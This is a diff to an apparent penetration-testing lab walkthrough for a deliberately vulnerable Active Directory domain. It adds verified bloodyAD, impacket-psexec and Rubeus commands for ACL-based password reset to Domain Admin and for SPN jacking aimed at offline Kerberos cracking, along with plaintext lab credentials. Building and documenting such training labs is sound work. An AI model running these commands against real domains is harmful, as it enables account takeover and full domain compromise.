@@ -17,10 +17,11 @@
 
 ### Branch A: ACL Abuse (cadre.local)
 
+> **Verification note (2026-07-29):** WT015 / ACE#7 was tested end-to-end. The ACE was missing on `chief_command` when first checked; it was restored via corrected `05-ad-attack-surface.yml` (deploy task now checks exact ForceChangePassword right) and `05-ad-attack-surface-verifyOnly.yml` now reports 18/18 PASS. `hunter_dfir` / `DF1R_Hunt3r!` was obtained via WT031 password spray, reset `chief_command` to `NewChiefPass123!`, verified DA+EA, and restored the original `C0mm@nd_Ch1ef!` password.
 
 **Diverges from:** Phase 4 (BloodHound reveals ACEs).
 **Converges to:** Phase 5+ (ACL abuse gives cadre.local DA, accelerating the main chain).
-**Prerequisite:** Any cadre.local domain credential (e.g., `analyst_dfir`, `analyst_cloud`, `hunter_dfir`).
+**Prerequisite:** Any cadre.local domain credential (e.g., `analyst_dfir`, `analyst_cloud`, `hunter_dfir`). In the current verified run, `hunter_dfir` was obtained via WT031 password spray using `cadre_passwords.txt`.
 
 > 💡 **Pre-BloodHound visual scan:** Run [ADeleg](Phase 0 Step 7) first from mbr01 to visually confirm the 14 ACEs are deployed correctly. ADeleg's View by Trustee directly maps to attacker perspective — faster setup than BloodHound, no EDR alerts, and produces report-ready screenshots. Use BloodHound for deep path-finding queries; use ADeleg for visual verification.
 
@@ -87,10 +88,20 @@ The results reveal these ACE chains across all 3 domains:
 
 #### Path A — ForceChangePassword (WT015)
 
+Verified live (2026-07-29). `hunter_dfir` / `DF1R_Hunt3r!` reset `chief_command` password to `NewChiefPass123!`, confirmed DA+EA login, then restored original password `C0mm@nd_Ch1ef!`.
+
 ```bash
+# Reset password
 bloodyAD --host 192.168.77.10 -d cadre.local -u hunter_dfir -p 'DF1R_Hunt3r!' \
-  set password "CN=chief_command,OU=Command,DC=cadre,DC=local" 'Pwn3d_DA!'
-impacket-psexec cadre.local/chief_command:'Pwn3d_DA!'@192.168.77.10  # DA verified
+  set password "CN=chief_command,OU=Command,DC=cadre,DC=local" 'NewChiefPass123!'
+
+# Validate DA+EA
+impacket-psexec cadre.local/chief_command:'NewChiefPass123!'@192.168.77.10 \
+  -c "whoami /groups"
+
+# Restore original lab password
+bloodyAD --host 192.168.77.10 -d cadre.local -u chief_command -p 'NewChiefPass123!' \
+  set password "CN=chief_command,OU=Command,DC=cadre,DC=local" 'C0mm@nd_Ch1ef!'
 ```
 
 #### Path B — WriteDacl Self-Escalate (WT013)
@@ -157,10 +168,15 @@ The `svc_backup` account is created with `acctDisabled=0` (active) and can be us
 #### SPN Jacking — CVE-2026-25177 (WT027)
 
 ```bash
-bloodyAD --host 192.168.77.10 -d cadre.local -u analyst_cloud -p 'Cl0ud_An@lyst!' \
+# VERIFIED 2026-08-01 — self-write command below is NOT viable as-is (see note).
+# Working path: account with writeSPN (chief_command = DA) plants a FREE same-realm SPN
+# on a controlled account -> KDC issues TGS encrypted with that account's key.
+bloodyAD --host 192.168.77.10 -d cadre.local -u chief_command -p 'C0mm@nd_Ch1ef!' \
   set object "CN=analyst_cloud,OU=Cloud,DC=cadre,DC=local" \
-  servicePrincipalName -v "MSSQLSvc/mbr01.child.cadre.local:1433"
+  servicePrincipalName -v "MSSQLSvc/dc01.cadre.local:14333"
 ```
+
+> **Verification note (2026-08-01):** Planted `MSSQLSvc/dc01.cadre.local:14333` on analyst_cloud as chief_command → LDAP read-back OK → `Rubeus asktgt /enctype:aes256` + `asktgs` → **KDC issued TGS encrypted with analyst_cloud's AES key** (attacker-known → offline crack). Cleanup confirmed (SPN removed). **Why the documented low-priv command fails:** (1) `MSSQLSvc/mbr01.child.cadre.local:1433` is already owned by `child\svc_mssql` → forest-wide SPN uniqueness → `A constraint violation occurred`; (2) a free cross-host service SPN via SELF-write → `Access is denied` (the default `Validated write to servicePrincipalName` on SELF only permits own-host SPNs). Cross-realm TGS (`mbr01.child.cadre.local` SPN vs `cadre.local` TGT) additionally needs a referral → `KDC_ERR_WRONG_REALM` in Rubeus asktgs; same-realm SPN avoids it. Also: Server 2025 KDC rejects TGS-REQ built on an RC4 TGT (`KDC_ERR_ETYPE_NOTSUPP`) — use an AES TGT.
 
 #### Persistence — AdminSDHolder (WT025)
 
